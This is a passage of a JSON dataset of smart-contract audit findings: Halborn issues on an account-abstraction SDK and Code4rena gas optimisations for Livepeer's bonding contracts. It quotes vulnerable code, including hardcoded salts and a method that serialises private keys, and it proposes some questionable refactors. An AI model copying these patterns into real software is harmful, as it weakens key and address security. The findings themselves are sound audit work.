      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Account Abstraction Schnorr Signatures SDK",
      "source_link": "https://www.halborn.com/audits/influx-technologies/account-abstraction-schnorr-signatures-sdk",
      "github_link": "",
      "tags": [
        "External Call",
        "from=to"
      ],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "52574",
      "title": "PREDICTABLE SALT (COLISSION ATTACK RISK)",
      "impact": "MEDIUM",
      "content": "##### Description\n\nThe codebase used in different code points a predictable salt value (`const salt = \"this is salt\"`), which could lead to a collision attack risk.\n\nA predictable salt could allow an attacker to precompute address collisions if they can anticipate the public keys used during contract deployments. This could result in unauthorized address generation, undermining the integrity of the smart account creation process.\n\n### Impact\n\nUsing a predictable salt in the smart account creation process increases the risk of:\n\n* **Address Collision Attacks:** An attacker could precompute the same address, potentially overriding a legitimate deployment.\n* **Unauthorized Asset Access:** If an address collision occurs, funds could be diverted or compromised.\n* **Smart Contract Integrity Compromise:** The deterministic nature of the salt could allow unauthorized access to smart accounts with predictable addresses.\n\n##### Proof of Concept\n\nListed below are some examples where the “salt” implementation was detected to be potentially insecure.\n\n* `examples/account-address/account_address.ts`\n\n```\nfunction getAddressOffChain(combinedAddresses: string[], salt: string) {\n  const factorySalt = \"aafactorysalt\"\n  const factoryAddress = deployments[polygon.id]?.MultiSigSmartAccountFactory\n```\n\n* `examples/account-address/account_address.ts`\n\n```\nconst combinedAddresses = getAllCombinedAddrFromKeys(publicKeys, 3)\nconst salt = \"random salt for randomly generated priv keys\"\n```\n\n* `examples/account-deployment/factory-create-account-method-call-deployment.ts`\n\n```\nlet privKey2\ndo privKey2 = randomBytes(32)\nwhile (!secp256k1.privateKeyVerify(privKey2))\nconst schnorrSigner2 = createSchnorrSigner(privKey2)\nconst publicKey2 = schnorrSigner2.getPubKey()\n\nconst salt = \"this is salt\"\n```\n\n* `examples/sign_3_of_3/sign-3_of_3.ts`\n\n```\n/**\n * Multi Sig participant #3\n */\nlet privKey3\ndo privKey3 = randomBytes(32)\nwhile (!secp256k1.privateKeyVerify(privKey3))\nconst schnorrSigner3 = createSchnorrSigner(privKey3)\n\nconst publicKey3 = schnorrSigner3.getPubKey()\n\n/**\n * Participants select SALT for the Smart Account\n * (Same 3 Participants can have multiple smart account's where id of those account is SALT)\n */\n\nconst salt = \"this is salt shared by participants 3\"\n```\n\n* `src/accountAbstraction/multiSigSmartAccount.ts`\n\n```\nexport async function createMultiSigSmartAccount({\n  transport,\n  chain,\n  entryPoint = getEntryPoint(chain, { version: \"0.6.0\" }),\n  accountAddress,\n  combinedAddress = [],\n  salt: _salt,\n}: CreateMultiSigSmartAccountParams): Promise<MultiSigSmartAccount> {\n  const client = createBundlerClient({\n    transport,\n    chain,\n  })\n  const salt = _salt ?? ethers.encodeBytes32String(\"salt\")\n```\n\n##### Score\n\nImpact: 5  \nLikelihood: 2\n\n##### Recommendation\n\nTo mitigate the predictable salt issue:\n\n* **Avoid Hardcoded Values:** Ensure salts are dynamically generated and not hardcoded in the source code.\n* **Use Cryptographically Secure Random Salts:** Generate salts using secure randomness (`randomBytes()` or `ethers.utils.randomBytes`).\n\n  ```\n  const salt = randomBytes(32).toString(\"hex\")\n  ```\n* **Incorporate User Input:** Optionally, derive the salt from both user-specific data and secure random values.\n\n##### Remediation\n\n**NOT APPLICABLE**: Finally agreed with the **InFlux Technologies team** that this issue was not applicable.\n\n##### Remediation Hash\n\n<https://github.com/RunOnFlux/account-abstraction/pull/17>",
      "summary": "\nThe report discusses a potential security issue with the codebase that uses a predictable value for the salt, which can make it vulnerable to attacks. This could result in unauthorized access to funds or smart contracts. The report provides examples where this issue was detected and recommends using cryptographically secure random salts and incorporating user input to mitigate the issue. The team has agreed that this issue is not applicable and has taken steps to fix it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Account Abstraction Schnorr Signatures SDK",
      "source_link": "https://www.halborn.com/audits/influx-technologies/account-abstraction-schnorr-signatures-sdk",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "52573",
      "title": "NOT-USED INSECURE METHOD",
      "impact": "LOW",
      "content": "##### Description\n\nThe `KeyPair` class exposed the `privateKey` in the `toJson()` method, which could potentially serialize and expose sensitive private key information to any consumer of this function.\n\nAlthough it was not invoked in the assessed version, its presence in the code represented a potential risk, particularly if the code is modified in future versions to call it or if the method is inadvertently exposed to insecure channels or logging systems.\n\n##### Proof of Concept\n\n* `src/types/key-pair.ts`\n\n```\nfirstnumber=24\ntoJson(): string {\n  return JSON.stringify({\n    publicKey: this.publicKey.toHex(),\n    privateKey: this.privateKey.toHex(),\n  })\n}\n```\n\n##### Score\n\nImpact: 3  \nLikelihood: 2\n\n##### Recommendation\n\n* **Remove all the potential insecure methods** that are not being used.\n* **Avoid Serializing Sensitive Data:** Do not expose private keys or sensitive information in the `toJson()` method or any other serialization mechanism.\n* **Limit Access to Private Keys:** Private keys should only be used within secure contexts and should never be serialized or exposed through external interfaces.\n\n##### Remediation\n\n**RISK ACCEPTED**: According to the **InFlux Technologies team**, they wanted to accept the risk of this issue.\n\n##### Remediation Hash\n\n<https://github.com/RunOnFlux/account-abstraction/pull/17>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Account Abstraction Schnorr Signatures SDK",
      "source_link": "https://www.halborn.com/audits/influx-technologies/account-abstraction-schnorr-signatures-sdk",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "27066",
      "title": "[G-10] Change the model of how events are emitted",
      "impact": "GAS",
      "content": "\nCurrently if we look at the event declaration we see something like this `event ParameterUpdate(string param);` and the actual emit as `emit ParameterUpdate(\"unbondingPeriod\");`.<br>\nThis method seems quite interesting especially for readability as we can clearly tell what the event is about. However, this method is quite expensive and an anti pattern. We can actually achieve the same readability by using named parameters for our event argument and naming the events using a descriptive name.\n\nhttps://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L155-L159\n\n### [G-10-01] BondingManager.sol.setUnbondingPeriod(): emit `_unbondingPeriod` instead of `\"unbondingPeriod\"` (Save 593 Gas on average)\n\n|        | Min    | Max    | Avg    |     \n| ------ | ------ | ------ | ------ | \n| Before | - | - | 61189 |     |\n| After  | - | - | 60596 |     |\n\n```solidity\nFile: /contracts/bonding/BondingManager.sol\n155:    function setUnbondingPeriod(uint64 _unbondingPeriod) external onlyControllerOwner {\n156:        unbondingPeriod = _unbondingPeriod;\n\n158:        emit ParameterUpdate(\"unbondingPeriod\");\n159:    }\n```\n\n```diff\ndiff --git a/contracts/bonding/BondingManager.sol b/contracts/bonding/BondingManager.sol\nindex 93e06ba..482d4e9 100644\n--- a/contracts/bonding/BondingManager.sol\n+++ b/contracts/bonding/BondingManager.sol\n@@ -136,6 +136,7 @@ contract BondingManager is ManagerProxyTarget, IBondingManager {\n         _;\n         _checkpointBondingState(_account, delegators[_account], transcoders[_account]);\n     }\n+    event setUnbondingPeriodNewValue(uint256 unbondingPeriod);\n\n     /**\n      * @notice BondingManager constructor. Only invokes constructor of base Manager contract with provided Controller address\n@@ -155,7 +156,7 @@ contract BondingManager is ManagerProxyTarget, IBondingManager {\n     function setUnbondingPeriod(uint64 _unbondingPeriod) external onlyControllerOwner {\n         unbondingPeriod = _unbondingPeriod;\n\n-        emit ParameterUpdate(\"unbondingPeriod\");\n+        emit setUnbondingPeriodNewValue(_unbondingPeriod);\n     }\n```\n\nhttps://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L186-L190\n\n### [G-10-02] BondingManager.sol.setNumActiveTranscoders(): Emit `_numActiveTranscoders` instead of `\"numActiveTranscoders\"` (Save 584 Gas on average)\n\n|        | Min    | Max    | Avg    |    \n| ------ | ------ | ------ | ------ |\n| Before | 47192 | 64292 | 55742 |     |\n| After  | 46608 | 63708 | 55158 |     |\n   \n```solidity\nFile: /contracts/bonding/BondingManager.sol\n186:    function setNumActiveTranscoders(uint256 _numActiveTranscoders) external onlyControllerOwner {\n187:        transcoderPool.setMaxSize(_numActiveTranscoders);\n\n189:        emit ParameterUpdate(\"numActiveTranscoders\");\n190:    }\n```\n\n```diff\n+            event setNumActiveTranscodersCeilingNewValue(uint256 _numActiveTranscoders);\n+\n\n     /**\n      * @notice BondingManager constructor. Only invokes constructor of base Manager contract with provided Controller address\n@@ -186,7 +188,7 @@ contract BondingManager is ManagerProxyTarget, IBondingManager {\n     function setNumActiveTranscoders(uint256 _numActiveTranscoders) external onlyControllerOwner {\n         transcoderPool.setMaxSize(_numActiveTranscoders);\n\n-        emit ParameterUpdate(\"numActiveTranscoders\");\n+        emit setNumActiveTranscodersCeilingNewValue(_numActiveTranscoders);\n     }\n\n```\n\n*The following are not covered by the tests thus we couldn't give an exact amount of gas being saved.*\n\nhttps://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L176-L180\n\n### [G-10-03] BondingManager.sol.setTreasuryBalanceCeiling(): Emit `_ceiling` instead of `\"treasuryBalanceCeiling\"`\n\n```solidity\nFile: /contracts/bonding/BondingManager.sol\n176:    function setTreasuryBalanceCeiling(uint256 _ceiling) external onlyControllerOwner {\n177:        treasuryBalanceCeiling = _ceiling;\n\n179:        emit ParameterUpdate(\"treasuryBalanceCeiling\");\n180:    }\n```\n\n```diff\n+        event settreasuryBalanceCeilingNewValue(uint256 treasuryBalanceCeiling);\n+\n     /**\n      * @notice BondingManager constructor. Only invokes constructor of base Manager contract with provided Controller address\n      * @dev This constructor will not initialize any state variables besides `controller`. The following setter functions\n@@ -176,7 +178,7 @@ contract BondingManager is ManagerProxyTarget, IBondingManager {\n     function setTreasuryBalanceCeiling(uint256 _ceiling) external onlyControllerOwner {\n         treasuryBalanceCeiling = _ceiling;\n\n-        emit ParameterUpdate(\"treasuryBalanceCeiling\");\n+        emit settreasuryBalanceCeilingNewValue(_ceiling);\n```\n\nhttps://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L462-L469\n\n### [G-10-04] BondingManager.sol.setCurrentRoundTotalActiveStake(): Emit `treasuryRewardCutRate` instead of `\"treasuryRewardCutRate\"`\n\n```solidity\nFile: /contracts/bonding/BondingManager.sol\n462:    function setCurrentRoundTotalActiveStake() external onlyRoundsManager {\n463:        currentRoundTotalActiveStake = nextRoundTotalActiveStake;\n\n465:        if (nextRoundTreasuryRewardCutRate != treasuryRewardCutRate) {\n466:            treasuryRewardCutRate = nextRoundTreasuryRewardCutRate;\n467:            // The treasury cut rate changes in a delayed fashion so we want to emit the parameter update event here\n468:            emit ParameterUpdate(\"treasuryRewardCutRate\");\n469:        }\n```\n\n```diff\n+   event setCurrentRoundTotalActiveStakeNewValue(uint256 treasuryRewardCutRate);\n\n     /**\n      * @notice BondingManager constructor. Only invokes constructor of base Manager contract with provided Controller address\n@@ -465,7 +466,7 @@ contract BondingManager is ManagerProxyTarget, IBondingManager {\n         if (nextRoundTreasuryRewardCutRate != treasuryRewardCutRate) {\n             treasuryRewardCutRate = nextRoundTreasuryRewardCutRate;\n             // The treasury cut rate changes in a delayed fashion so we want to emit the parameter update event here\n-            emit ParameterUpdate(\"treasuryRewardCutRate\");\n+            emit setCurrentRoundTotalActiveStakeNewValue(treasuryRewardCutRate);\n         }\n```\n\n\nhttps://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L1176-L1182\n\n### [G-10-05] BondingManager.sol.\\_setTreasuryRewardCutRate(): Emit `_cutRate` instead of `\"nextRoundTreasuryRewardCutRate\"`\n\n```solidity\nFile: /contracts/bonding/BondingManager.sol\n1176:    function _setTreasuryRewardCutRate(uint256 _cutRate) internal {\n1177:        require(PreciseMathUtils.validPerc(_cutRate), \"_cutRate is invalid precise percentage\");\n\n1179:        nextRoundTreasuryRewardCutRate = _cutRate;\n\n1181:        emit ParameterUpdate(\"nextRoundTreasuryRewardCutRate\");\n1182:    }\n```\n\n```diff\n+   event setTreasuryRewardCutRateNewValue(uint256 nextRoundTreasuryRewardCutRate);\n     /**\n      * @notice BondingManager constructor. Only invokes constructor of base Manager contract with provided Controller address\n      * @dev This constructor will not initialize any state variables besides `controller`. The following setter functions\n@@ -1178,7 +1178,7 @@ contract BondingManager is ManagerProxyTarget, IBondingManager {\n\n         nextRoundTreasuryRewardCutRate = _cutRate;\n\n-        emit ParameterUpdate(\"nextRoundTreasuryRewardCutRate\");\n+        emit setTreasuryRewardCutRateNewValue(_cutRate);\n     }\n```\n\n## Conclusion\n\nIt is important to emphasize that the provided recommendations aim to enhance the efficiency of the code without compromising its readability. We understand the value of maintainable and easily understandable code to both developers and auditors.\n\nAs you proceed with implementing the suggested optimizations, please exercise caution and be diligent in conducting thorough testing. It is crucial to ensure that the changes are not introducing any new vulnerabilities and that the desired performance improvements are achieved. Review code changes, and perform thorough testing to validate the effectiveness and security of the refactored code.\n\nShould you have any questions or need further assistance, please don't hesitate to reach out.\n\n**[victorges (Livepeer) acknowledged](https://github.com/code-423n4/2023-08-livepeer-findings/issues/222#issuecomment-1732041299)**\n\n\n\n***\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2023-08-livepeer",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27065",
      "title": "[G-09] Optimizing check order for cost efficient function execution",
      "impact": "GAS",
      "content": "\nChecks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (2100 gas) in a function that may ultimately revert in the unhappy case.\n\nhttps://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L745-L784\n\n### [G-09-01] Validate the function parameter `_amount` first before making any state reads/writes\n\n```solidity\nFile: /contracts/bonding/BondingManager.sol\n745:    function unbondWithHint(\n\n749:    ) public whenSystemNotPaused currentRoundInitialized autoClaimEarnings(msg.sender) autoCheckpoint(msg.sender) {\n750:        require(delegatorStatus(msg.sender) == DelegatorStatus.Bonded, \"caller must be bonded\");\n\n752:        Delegator storage del = delegators[msg.sender];\n\n755:        require(_amount > 0, \"unbond amount must be greater than 0\");\n```\n\n```diff\ndiff --git a/contracts/bonding/BondingManager.sol b/contracts/bonding/BondingManager.sol\nindex 93e06ba..c43f3e3 100644\n--- a/contracts/bonding/BondingManager.sol\n+++ b/contracts/bonding/BondingManager.sol\n@@ -747,11 +747,12 @@ contract BondingManager is ManagerProxyTarget, IBondingManager {\n         address _newPosPrev,\n         address _newPosNext\n     ) public whenSystemNotPaused currentRoundInitialized autoClaimEarnings(msg.sender) autoCheckpoint(msg.sender) {\n+        require(_amount > 0, \"unbond amount must be greater than 0\");\n+\n         require(delegatorStatus(msg.sender) == DelegatorStatus.Bonded, \"caller must be bonded\");\n\n         Delegator storage del = delegators[msg.sender];\n\n-        require(_amount > 0, \"unbond amount must be greater than 0\");\n         require(_amount <= del.bondedAmount, \"amount is greater than bonded amount\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2023-08-livepeer",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27064",
      "title": "[G-08] BondingVotes.sol: We can optimize the function `checkpointBondingState`",
      "impact": "GAS",
      "content": "\n**Note: no gas estimates as it was not covered by the tests.**\n\n```solidity\nFile: /contracts/bonding/BondingVotes.sol\n258:    function checkpointBondingState(\n\n266:    ) external virtual onlyBondingManager {\n\n273:        BondingCheckpoint memory previous;\n274:        if (hasCheckpoint(_account)) {\n275:            previous = getBondingCheckpointAt(_account, _startRound);\n276:        }\n\n278:        BondingCheckpointsByRound storage checkpoints = bondingCheckpoints[_account];\n```\n\nThe if statement on line 274 makes two function calls `hasCheckpoint(_account)` and `getBondingCheckpointAt(_account, _startRound)`.\n\nThe implementation of `hasCheckpoint(_account)`  is as below:\n\n```solidity\n315:    function hasCheckpoint(address _account) public view returns (bool) {\n316:        return bondingCheckpoints[_account].startRounds.length > 0;\n317:    }\n```\n\nWe can see the return statement reads `bondingCheckpoints[_account]` which we already had cached in the main function as `checkpoints`. Inline the `hasCheckpoint` function would help us use the cached value.\n\nThe next function `getBondingCheckpointAt()` has an implementation that has the following state read:<br>\n`BondingCheckpointsByRound storage checkpoints = bondingCheckpoints[_account];`<br>\nWhich is equivalent to the variable we cached in the main function. Inlining this  function would avoid making two state reads which are quite expensive.\n\nWe should refactor the code as follows:\n```diff\ndiff --git a/contracts/bonding/BondingVotes.sol b/contracts/bonding/BondingVotes.sol\nindex 2408c66..ca92f91 100644\n--- a/contracts/bonding/BondingVotes.sol\n+++ b/contracts/bonding/BondingVotes.sol\n@@ -271,26 +271,44 @@ contract BondingVotes is ManagerProxyTarget, IBondingVotes {\n         }\n\n         BondingCheckpoint memory previous;\n-        if (hasCheckpoint(_account)) {\n-            previous = getBondingCheckpointAt(_account, _startRound);\n-        }\n-\n         BondingCheckpointsByRound storage checkpoints = bondingCheckpoints[_account];\n+        if (checkpoints.startRounds.length > 0){\n+           if (_startRound > clock() + 1) {\n+                 revert FutureLookup(_startRound, clock() + 1);\n+            }\n+            // Most of the time we will be calling this for a transcoder which checkpoints on every round through reward().\n+            // On those cases we will have a checkpoint for exactly the round we want, so optimize for that.\n+            BondingCheckpoint storage bond = checkpoints.data[_startRound];\n+            if (bond.bondedAmount > 0) {\n+                previous = bond;\n+            }\n+\n+            uint256 startRoundIdx = checkpoints.startRounds.findLowerBound(_startRound);\n+            if (startRoundIdx == checkpoints.startRounds.length) {\n+                // No checkpoint at or before _round, so return the zero BondingCheckpoint value. This also happens if there\n+                // are no checkpoints for _account. The voting power will be zero until the first checkpoint is made.\n+                previous = bond;\n+            }\n+\n+            uint256 startRound = checkpoints.startRounds[startRoundIdx];\n+            previous = checkpoints.data[startRound];\n+\n+            }\n\n-        BondingCheckpoint memory bond = BondingCheckpoint({\n+        BondingCheckpoint memory _bond = BondingCheckpoint({\n             bondedAmount: _bondedAmount,\n             delegateAddress: _delegateAddress,\n             delegatedAmount: _delegatedAmount,\n             lastClaimRound: _lastClaimRound,\n             lastRewardRound: _lastRewardRound\n         });\n-        checkpoints.data[_startRound] = bond;\n+        checkpoints.data[_startRound] = _bond;\n\n         // now store the startRound itself in the startRounds array to allow us\n         // to find it and lookup in the above mapping\n         checkpoints.startRounds.pushSorted(_startRound);\n\n-        onBondingCheckpointChanged(_account, previous, bond);\n+        onBondingCheckpointChanged(_account, previous, _bond);\n     }\n\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2023-08-livepeer",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27063",
      "title": "[G-07] Function `slashTranscoder()` can be optimized",
      "impact": "GAS",
      "content": "\n**Note: not covered by the tests.**\n\n```solidity\nFile: /contracts/bonding/BondingManager.sol\n394:    function slashTranscoder(\n\n399:    ) external whenSystemNotPaused onlyVerifier autoClaimEarnings(_transcoder) autoCheckpoint(_transcoder) {\n400:        Delegator storage del = delegators[_transcoder];\n\n402:        if (del.bondedAmount > 0) {\n403:            uint256 penalty = MathUtils.percOf(delegators[_transcoder].bondedAmount, _slashAmount);\n\n413:            // If still bonded decrease delegate's delegated amount\n414:            if (delegatorStatus(_transcoder) == DelegatorStatus.Bonded) {\n415:                delegators[del.delegateAddress].delegatedAmount = delegators[del.delegateAddress].delegatedAmount.sub(\n416:                    penalty\n417:                );\n418:            }\n```\nThe function call `delegatorStatus(_transcoder)` ends up making a similar state read like the one in the calling function ie  `Delegator storage del = delegators[_transcoder];`.<br>\nWe can refactor the code to avoid this as follows.\n\n```diff\n     // Time between unbonding and possible withdrawl in rounds\n     uint64 public unbondingPeriod;\n+    DelegatorStatus delegatorStatus_;\n\n+\n     function slashTranscoder(\n         address _transcoder,\n         address _finder,\n@@ -400,7 +402,7 @@ contract BondingManager is ManagerProxyTarget, IBondingManager {\n         Delegator storage del = delegators[_transcoder];\n\n         if (del.bondedAmount > 0) {\n-            uint256 penalty = MathUtils.percOf(delegators[_transcoder].bondedAmount, _slashAmount);\n+            uint256 penalty = MathUtils.percOf(del.bondedAmount, _slashAmount);\n\n             // If active transcoder, resign it\n             if (transcoderPool.contains(_transcoder)) {\n@@ -410,8 +412,21 @@ contract BondingManager is ManagerProxyTarget, IBondingManager {\n             // Decrease bonded stake\n             del.bondedAmount = del.bondedAmount.sub(penalty);\n\n+            if (del.bondedAmount == 0) {\n+                // Delegator unbonded all its tokens\n+                delegatorStatus_= DelegatorStatus.Unbonded;\n+            } else if (del.startRound > roundsManager().currentRound()) {\n+                // Delegator round start is in the future\n+                delegatorStatus_ =  DelegatorStatus.Pending;\n+            } else {\n+                // Delegator round start is now or in the past\n+                // del.startRound != 0 here because if del.startRound = 0 then del.bondedAmount = 0 which\n+                // would trigger the first if clause\n+                delegatorStatus_ =  DelegatorStatus.Bonded;\n+            }\n+\n             // If still bonded decrease delegate's delegated amount\n-            if (delegatorStatus(_transcoder) == DelegatorStatus.Bonded) {\n+            if (delegatorStatus_ == DelegatorStatus.Bonded) {\n                 delegators[del.delegateAddress].delegatedAmount = delegators[del.delegateAddress].delegatedAmount.sub(\n                     penalty\n                 );\n```\n\nhttps://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingVotes.sol#L258-L294\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2023-08-livepeer",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27062",
      "title": "[G-06] Refactor the function `unbondWithHint()` (Save 1452 Gas)",
      "impact": "GAS",
      "content": "\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | -    | 509309   | - | - |\n| After  | -    | 507857   | - | - |\n\n```solidity\nFile: /contracts/bonding/BondingManager.sol\n745:    function unbondWithHint(\n\n749:    ) public whenSystemNotPaused currentRoundInitialized autoClaimEarnings(msg.sender) autoCheckpoint(msg.sender) {\n750:        require(delegatorStatus(msg.sender) == DelegatorStatus.Bonded, \"caller must be bonded\");\n\n752:        Delegator storage del = delegators[msg.sender];\n```\n\nThe require statement calls the function `delegatorStatus(msg.sender)` which has the implementation:\n\n```solidity\n956:    function delegatorStatus(address _delegator) public view returns (DelegatorStatus) {\n957:        Delegator storage del = delegators[_delegator];\n\n959:        if (del.bondedAmount == 0) {\n960:            // Delegator unbonded all its tokens\n961:            return DelegatorStatus.Unbonded;\n962:        } else if (del.startRound > roundsManager().currentRound()) {\n963:            // Delegator round start is in the future\n964:            return DelegatorStatus.Pending;\n965:        } else {\n\n969:            return DelegatorStatus.Bonded;\n970:        }\n971:    }\n```\n\nNote we make a state read `Delegator storage del = delegators[_delegator];`.\n\nIn the calling function , we pass `msg.sender` as the function parameter which means our state read in the function being called is `Delegator storage del = delegators[msg.sender];` which is the same state read we make in the main function. This means we are making this call twice(too much gas).\n\nFor this to work, we introduce a new state variable to keep track of the status as shown below.\n\n```diff\ndiff --git a/contracts/bonding/BondingManager.sol b/contracts/bonding/BondingManager.sol\nindex 93e06ba..3ec3b73 100644\n--- a/contracts/bonding/BondingManager.sol\n+++ b/contracts/bonding/BondingManager.sol\n@@ -33,6 +33,7 @@ contract BondingManager is ManagerProxyTarget, IBondingManager {\n\n     // Time between unbonding and possible withdrawl in rounds\n     uint64 public unbondingPeriod;\n+        DelegatorStatus delegatorStatus_;\n\n     // Represents a transcoder's current state\n     struct Transcoder {\n@@ -742,20 +743,34 @@ contract BondingManager is ManagerProxyTarget, IBondingManager {\n      * @param _newPosPrev Address of previous transcoder in pool if the caller remains in the pool\n      * @param _newPosNext Address of next transcoder in pool if the caller remains in the pool\n      */\n+\n     function unbondWithHint(\n         uint256 _amount,\n         address _newPosPrev,\n         address _newPosNext\n     ) public whenSystemNotPaused currentRoundInitialized autoClaimEarnings(msg.sender) autoCheckpoint(msg.sender) {\n-        require(delegatorStatus(msg.sender) == DelegatorStatus.Bonded, \"caller must be bonded\");\n\n         Delegator storage del = delegators[msg.sender];\n-\n         require(_amount > 0, \"unbond amount must be greater than 0\");\n         require(_amount <= del.bondedAmount, \"amount is greater than bonded amount\");\n+        uint256 currentRound = roundsManager().currentRound();\n+        if (del.bondedAmount == 0) {\n+            // Delegator unbonded all its tokens\n+            delegatorStatus_ = DelegatorStatus.Unbonded;\n+        } else if (del.startRound > currentRound) {\n+            // Delegator unbonded all its tokens\n+            delegatorStatus_ = DelegatorStatus.Pending;\n+        } else {\n+            // Delegator round start is now or in the past\n+            // del.startRound != 0 here because if del.startRound = 0 then del.bondedAmount = 0 which\n+            // would trigger the first if clause\n+            delegatorStatus_ = DelegatorStatus.Bonded;\n+        }\n+\n+        require(delegatorStatus_ == DelegatorStatus.Bonded, \"caller must be bonded\");\n\n         address currentDelegate = del.delegateAddress;\n-        uint256 currentRound = roundsManager().currentRound();\n+\n         uint256 withdrawRound = currentRound.add(unbondingPeriod);\n         uint256 unbondingLockId = del.nextUnbondingLockId;\n\n```\n\nhttps://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L394-L418\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2023-08-livepeer",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27061",
      "title": "[G-05] Function `increaseTotalStakeUncheckpointed()` can be more optimized (save 148 Gas on average)",
      "impact": "GAS",
      "content": "\nGas benchmarks based on function `rewardWithHint` that calls our internal function.\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | -    | 453410   | - | - |\n| After  | -    | 453262   | - | - |\n```solidity\nFile: /contracts/bonding/BondingManager.sol\n1307:    function increaseTotalStakeUncheckpointed(\n\n1312:    ) internal {\n\n1318:        if (isRegisteredTranscoder(_delegate)) {\n1319:            uint256 currRound = roundsManager().currentRound();\n1320:            uint256 nextRound = currRound.add(1);\n\n1343:        // Increase delegate's delegated amount\n1344:        delegators[_delegate].delegatedAmount = newStake;\n1345:    }\n```\n\nThe if statement makes a call to a function `isRegisteredTranscoder(_delegate)` whose implementation is as follows:\n\n```solidity\n1156:    function isRegisteredTranscoder(address _transcoder) public view returns (bool) {\n1157:        Delegator storage d = delegators[_transcoder];\n1158:        return d.delegateAddress == _transcoder && d.bondedAmount > 0;\n1159:    }\n```\n\nNote in the function above, we cache `delegators[_transcoder]` with `_transcoder` being the address passed to the function, so in the context of our function it would look like `Delegator storage d = delegators[_delegate];`\nOn the calling function line 1344, we write to the state variable `delegators[_delegate].delegatedAmount`, as we already cached the variable `delegators[_delegate]` we don't need to call it directly but instead we should use the cached reference. As the cached one is simply a pointer to the original one, we would still be writing to the state variable as required.\n\n```diff\n-        if (isRegisteredTranscoder(_delegate)) {\n+        Delegator storage d = delegators[_delegate];\n+        if (d.delegateAddress == _delegate && d.bondedAmount > 0) {\n             uint256 currRound = roundsManager().currentRound();\n             uint256 nextRound = currRound.add(1);\n\n@@ -1341,8 +1341,7 @@ contract BondingManager is ManagerProxyTarget, IBondingManager {\n         }\n\n         // Increase delegate's delegated amount\n-        delegators[_delegate].delegatedAmount = newStake;\n-    }\n+        d.delegatedAmount = newStake;//@audit Refactor the call due to the function call isRegisteredTranscoder?    }\n\n```\n\nhttps://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L745-L784\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2023-08-livepeer",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27060",
      "title": "[G-04] Function `rewardWithHint()` optimization (Save 4716 Gas on average)",
      "impact": "GAS",
      "content": "\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | -    | 453410   | - | - |\n| After  | -    | 448694   | - | - |\n```solidity\nFile: /contracts/bonding/BondingManager.sol\n842:    function rewardWithHint(address _newPosPrev, address _newPosNext)\n\n847:    {\n848:        uint256 currentRound = roundsManager().currentRound();\n\n850:        require(isActiveTranscoder(msg.sender), \"caller must be an active transcoder\");\n851:        require(\n852:            transcoders[msg.sender].lastRewardRound != currentRound,\n853:            \"caller has already called reward for the current round\"\n854:        );\n\n856:        Transcoder storage t = transcoders[msg.sender];\n```\n\nWe look into the implementation of the function `isActiveTranscoder` which is being called in the require statement. The function has the following implementation:\n\n```solidity\n1145:    function isActiveTranscoder(address _transcoder) public view returns (bool) {\n1146:        Transcoder storage t = transcoders[_transcoder];\n1147:        uint256 currentRound = roundsManager().currentRound();\n1148:        return t.activationRound <= currentRound && currentRound < 